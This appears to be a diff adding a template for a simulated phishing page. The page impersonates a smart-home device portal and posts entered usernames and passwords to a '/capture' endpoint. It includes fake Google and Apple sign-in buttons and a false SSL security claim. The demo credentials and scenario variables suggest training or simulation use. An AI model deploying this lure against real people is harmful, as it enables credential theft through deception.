@@ -1,0 +1,105 @@
+{% extends "base.html" %}
+{% block title %}{{ scenario.brand_name }} — Sign In{% endblock %}
+{% block body_class %}login-page{% endblock %}
+
+{% block content %}
+<div class="login-container">
+    <div class="login-card">
+        <!-- Device Brand Header -->
+        <div class="login-header" style="background: linear-gradient(135deg, {{ scenario.color }}, {{ scenario.color }}dd);">
+            <div class="login-brand-icon">{{ scenario.icon }}</div>
+            <h1 class="login-brand-title">{{ scenario.brand_name }}</h1>
+            <p class="login-brand-subtitle">Device Management Portal</p>
+        </div>
+
+        <!-- Login Form -->
+        <div class="login-body">
+            <h2 class="login-title">Sign in to your account</h2>
+            <p class="login-subtitle">Access your {{ scenario.device_name }} dashboard</p>
+
+            <form action="/capture" method="POST" id="login-form" autocomplete="off">
+                <div class="form-group">
+                    <label for="username" class="form-label">
+                        <span class="label-icon">👤</span> Email or Username
+                    </label>
+                    <input
+                        type="text"
+                        id="username"
+                        name="username"
+                        class="form-input"
+                        placeholder="Enter your email or username"
+                        {% if demo %}value="demo@smarthome.local"{% endif %}
+                        required
+                        maxlength="100"
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="password" class="form-label">
+                        <span class="label-icon">🔒</span> Password
+                    </label>
+                    <div class="password-wrapper">
+                        <input
+                            type="password"
+                            id="password"
+                            name="password"
+                            class="form-input"
+                            placeholder="Enter your password"
+                            {% if demo %}value="demo123"{% endif %}
+                            required
+                            maxlength="100"
+                        >
+                        <button type="button" class="toggle-password" id="toggle-password" onclick="togglePasswordVisibility()">
+                            👁️
+                        </button>
+                    </div>
+                </div>
+
+                <div class="form-options">
+                    <label class="checkbox-label">
+                        <input type="checkbox" class="form-checkbox"> Remember this device
+                    </label>
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="login-btn" id="login-submit" style="background: {{ scenario.color }};">
+                    <span class="btn-text">Sign In</span>
+                    <span class="btn-spinner" id="login-spinner" style="display:none;">⟳</span>
+                </button>
+            </form>
+
+            <!-- Fake Social Login -->
+            <div class="social-divider">
+                <span>or continue with</span>
+            </div>
+            <div class="social-buttons">
+                <button class="social-btn" type="button" onclick="document.getElementById('login-form').submit()">
+                    <span>G</span> Google
+                </button>
+                <button class="social-btn" type="button" onclick="document.getElementById('login-form').submit()">
+                    <span>🍎</span> Apple
+                </button>
+            </div>
+        </div>
+
+        <!-- Login Footer -->
+        <div class="login-footer">
+            <div class="device-info">
+                <span class="device-label">{{ scenario.device_name }}</span>
+                <span class="firmware-version">Firmware v3.2.1 | Portal v2.0.4</span>
+            </div>
+            <p class="login-security-note">🔒 Secured with 256-bit SSL encryption</p>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    // Show spinner on form submit
+    document.getElementById('login-form').addEventListener('submit', function() {
+        document.querySelector('.btn-text').style.display = 'none';
+        document.getElementById('login-spinner').style.display = 'inline-block';
+    });
+</script>
+{% endblock %}
